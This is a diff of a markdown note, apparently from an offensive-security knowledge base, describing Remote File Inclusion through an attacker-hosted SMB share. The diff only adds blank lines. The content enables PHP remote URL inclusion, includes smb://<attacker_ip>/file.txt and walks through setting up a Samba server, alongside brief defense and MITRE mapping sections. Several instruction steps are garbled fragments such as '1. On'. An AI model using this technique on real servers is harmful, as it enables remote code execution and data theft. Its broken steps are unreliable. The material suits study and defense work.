@@ -40,11 +40,15 @@ From a technical perspective, the attacker can use a specially crafted URL to in
 
 From a business perspective, this technique can be used by attackers to gain access to sensitive data, execute arbitrary code, or escalate privileges. This can result in financial losses, reputational damage, and legal liabilities for the affected organization.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable application that includes remote files via SMB
 
 1. Access to a SMB share
+
+ 
 
 ## Defense
 
@@ -54,6 +58,8 @@ From a business perspective, this technique can be used by attackers to gain acc
 
 1. Monitor network traffic for SMB-related activity
 
+ 
+
 ## Objectives
 
 1. Gain access to sensitive data
@@ -62,13 +68,23 @@ From a business perspective, this technique can be used by attackers to gain acc
 
 1. Escalate privileges
 
+ 
+
 # Instructions
 
 1. On
 
+ 
+
+
+
 **Code**: [[allow_url_include]]
 
+
+
 > the vulnerable application is allowed to include remote files via URLs.
+
+
 
 **Command** ([[Enabling allow_url_include]]):
 
@@ -76,11 +92,21 @@ From a business perspective, this technique can be used by attackers to gain acc
 allow_url_include = On
 ```
 
+
+
 2. On
+
+ 
+
+
 
 **Code**: [[allow_url_fopen]]
 
+
+
 > the vulnerable application is allowed to open remote files via URLs.
+
+
 
 **Command** ([[Enable allow_url_fopen]]):
 
@@ -88,11 +114,21 @@ allow_url_include = On
 allow_url_fopen = On
 ```
 
+
+
 3. smb://<attacker_ip>/file.txt
+
+ 
+
+
 
 **Code**: [[smb]]
 
+
+
 > command. This command includes the remote file located at smb://<attacker_ip>/file.txt
+
+
 
 **Command** ([[Install Samba]]):
 
@@ -100,11 +136,19 @@ allow_url_fopen = On
 sudo apt-get install samba
 ```
 
+
+
+
+
 **Command** ([[Configure Samba]]):
 
 ```bash
 sudo nano /etc/samba/smb.conf
 ```
+
+
+
+
 
 **Command** ([[Create a Samba User]]):
 
@@ -112,11 +156,17 @@ sudo nano /etc/samba/smb.conf
 sudo smbpasswd -a username
 ```
 
+
+
+
+
 **Command** ([[Restart Samba Service]]):
 
 ```bash
 sudo service smbd restart
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -143,3 +193,5 @@ sudo service smbd restart
 - [[Basic RFI]]
 - [[Bypass allow_url_include]]
 - [[File Inclusion]]
+
+
